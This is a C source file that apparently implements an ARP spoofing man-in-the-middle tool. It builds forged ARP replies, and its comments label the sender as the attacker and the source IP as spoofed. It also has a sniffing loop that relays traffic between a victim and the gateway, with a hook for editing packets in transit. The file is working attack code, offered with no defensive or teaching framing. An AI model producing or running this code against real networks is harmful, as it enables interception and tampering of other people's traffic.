#include "arp.h"
 
static packet_edit_callback __packet_edit_callback__ = 0;

void register_packet_edit_callback(packet_edit_callback cb)
{
    __packet_edit_callback__ = cb;
}

int create_arp_udp_socket()
{
    int sock = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
    if (sock < 0) printf("[-] Error opening arp socket  |  * Try running with admin privileges * [-]\n");
    return sock;
}

int create_sniffing_socket()
{
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) printf("[-] Could not create raw ip socket for packet sniffing [-]\n");
    return sock;
}

void send_arp_request(int sock, LOCAL_NET_DATA lnd, ipaddr dest_ip, macaddr* dest_mac_out)
{
    const unsigned char ether_broadcast_addr[] =
        { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

    struct sockaddr_ll addr = { 0 };
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = lnd.interface_index;
    addr.sll_halen    = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

    /* construct the ARP request */
    struct ether_arp arp_packet;
  	arp_packet.arp_hrd = htons(ARPHRD_ETHER);
  	arp_packet.arp_pro = htons(ETH_P_IP);
  	arp_packet.arp_hln = ETHER_ADDR_LEN;
  	arp_packet.arp_pln = sizeof(in_addr_t);
    arp_packet.arp_op = htons(ARPOP_REQUEST);

    /* set sender information of the packet */
    memcpy(&arp_packet.arp_sha, &lnd.mac_address, sizeof(arp_packet.arp_sha));
    memcpy(&arp_packet.arp_spa, &lnd.ip_address, sizeof(arp_packet.arp_spa));

    /* set target information of the packet */
    memset(&arp_packet.arp_tha, 0, sizeof(arp_packet.arp_tha)); // 00:00:00:00:00:00
    memcpy(&arp_packet.arp_tpa, &dest_ip, sizeof(arp_packet.arp_tpa));

    /* send arp request */
  	if (sendto(sock, &arp_packet, sizeof(struct ether_arp), 0, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
  		  printf("[-] Error sending ARP request [-]\n");
    }

    while (1)
    {
        int buffer = recv(sock, &arp_packet, sizeof(struct ether_arp), 0);
        if (buffer == -1) {
            printf("[-] Error recieving ARP reply [-]\n");
            break;
        }
        if (buffer == 0) {   /* no response */
            printf("[*] No Response . . . [*]\n");
            continue;
        }

        unsigned int sender_address =
			         (arp_packet.arp_spa[3] << 24)
		         | (arp_packet.arp_spa[2] << 16)
		         | (arp_packet.arp_spa[1] << 8)
             | (arp_packet.arp_spa[0] << 0);

        if (sender_address == dest_ip)
        {
            memcpy(dest_mac_out, &arp_packet.arp_sha, sizeof(macaddr));
            break;
        }
    }
}

int send_arp_packet(int sock, int iface_index, struct arp_packet pkt)
{
    struct ether_arp arp_packet;

    struct sockaddr_ll addr = {0};
    addr.sll_family = AF_PACKET;
    addr.sll_ifindex = iface_index;
    addr.sll_halen = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, pkt.dest_mac, ETHER_ADDR_LEN);  // destination physical address

    // basic info about the arp packet
    arp_packet.arp_hrd = htons(ARPHRD_ETHER);
  	arp_packet.arp_pro = htons(ETH_P_IP);
  	arp_packet.arp_hln = ETHER_ADDR_LEN;
  	arp_packet.arp_pln = sizeof(in_addr_t);
    arp_packet.arp_op = htons(ARPOP_REPLY);

    /*======== Resulting Structure ========

    Source MAC : local mac (attacker)
    Source IP  : ip of the machine attacker wants
                 destination machine to believe is the source

    Destination MAC : real destination physical address
    Destination IP  : real destination ip address

    ======================================*/

    // Source MAC [REAL if performing mitm]
    memcpy(&arp_packet.arp_sha, pkt.sender_mac, sizeof(arp_packet.arp_sha));

    // Source IP [SPOOFED / FAKE if performing mitm]
    memcpy(&arp_packet.arp_spa, &pkt.sender_ip, sizeof(arp_packet.arp_spa));

    // Destination MAC [REAL if performing mitm]
    memcpy(&arp_packet.arp_tha, pkt.dest_mac, sizeof(arp_packet.arp_tha));

    // Destination ip [REAL if performing mitm]
    memcpy(&arp_packet.arp_tpa, &pkt.dest_ip, sizeof(arp_packet.arp_tpa));

    //================================================================//
    //=================== Packet Construction Done ===================//
    //================================================================//

    // sending the packet
    if (sendto(sock, &arp_packet, sizeof(arp_packet), 0, (struct sockaddr*)&addr, sizeof(addr)) == -1) {
		    printf("Error sending arp packet to %s\n", iptostr(pkt.dest_ip));
    }
}

void craft_arp_packet(struct arp_packet* pkt, ipaddr sender_ip, macaddr sender_mac, ipaddr dest_ip, macaddr dest_mac)
{
    memcpy(&pkt->sender_ip, &sender_ip, sizeof(pkt->sender_ip));
    memcpy(pkt->sender_mac, sender_mac, sizeof(pkt->sender_mac));
    memcpy(&pkt->dest_ip, &dest_ip, sizeof(pkt->dest_ip));
    memcpy(pkt->dest_mac, dest_mac, sizeof(pkt->dest_mac));
}

void start_sniffing_loop(int sniffing_socket, LOCAL_NET_DATA lnd, macaddr target_mac, macaddr gateway_mac)
{
    sniffing_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sniffing_socket < 0) {
        printf("Could not create raw ip socket for packet sniffing . . .\n");
        return;
    }

    uint8_t buffer[0xFFFF];
    int should_forward_packet = 0;

    socklen_t sl = sizeof(struct sockaddr_ll);
    struct sockaddr_ll laddr;


    struct sockaddr_ll addr;
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ALL);
    addr.sll_ifindex = lnd.interface_index;
    addr.sll_pkttype = PACKET_HOST;
    addr.sll_halen = 0;

    //RegisterPacketEditCallback(EditPacket);

    while (1)
    {
        should_forward_packet = 0;

        // recieve packets from the target
        int bytes = recvfrom(sniffing_socket, buffer, 0xFFFF, 0, (struct sockaddr*)&laddr, &sl);
        if (bytes < 0)
        {
            printf("[-] Error occured when sniffing packets [-]\n");
            break;
        }
        if (bytes == 0) continue;

        struct eth_layer ethl = get_ethernet_layer(buffer);
        if (ethl.protocol == ETH_P_IP)
        {
            // if packet source is our target and we are the the packet destination
            int packet_direction = 0;
            if (cmp_macaddr(ethl.src, target_mac) == 0)        // outgoing
                packet_direction = 1;
            else if (cmp_macaddr(ethl.src, gateway_mac) == 0)  // incoming
                packet_direction = 2;

            if (packet_direction && cmp_macaddr(ethl.dest, lnd.mac_address) == 0)
            {
                struct ip_layer ipl = get_ip_layer(buffer);
                if (ipl.dest_addr != lnd.ip_address)
                {
                    should_forward_packet = 1;

                    for (int i = 0; i < 6; i++)
                        ethl.src[i] = lnd.mac_address[i];

                    if (packet_direction == 1)      // outgoing
                        for (int i = 0; i < 6; i++)
                            ethl.dest[i] = gateway_mac[i];
                    else if (packet_direction == 2) // incoming
                        for (int i = 0; i < 6; i++)
                            ethl.dest[i] = target_mac[i];

                    modify_ethernet_layer(buffer, ethl);
                }
            }
        }

        // Forwarding packet if necessary.
        if (should_forward_packet)
        {
            if (__packet_edit_callback__ != 0)
                __packet_edit_callback__(buffer);
            
            sendto(sniffing_socket, buffer, bytes, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll));
        }
    }
}

